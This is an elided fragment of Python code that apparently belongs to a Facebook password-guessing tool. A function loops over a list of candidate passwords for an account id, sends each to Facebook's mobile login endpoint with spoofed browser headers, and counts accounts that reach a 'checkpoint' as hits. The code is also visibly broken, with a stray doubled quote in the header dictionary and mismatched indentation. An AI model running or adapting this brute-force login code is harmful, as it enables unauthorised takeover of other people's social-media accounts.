...
def validate2(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({'p':'facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,''accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',})
    ...
    'dpr': '2.75',
    'pragma': 'no-cache',
    'referer': 'https://p.facebook.com/?stype=lo&deoia=1&jlou=Afc9DbA-waSxK73wRJY4-NvIKWztFT3Lj75juEJwZCwbxhxBihLRFP0h8EtWh8sNudICdVZ8c4asvBVU3yfR3PduiCW2EpcFbkCdrlcJypFCsw&smuh=275&lh=Ac8P7HVkesCx7NqKKuE&wtsid=rdr_0HVhi9gTbGzquZG7N&_rdr',
    ...
    'viewport-width': '980',
			...
			po = ses.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
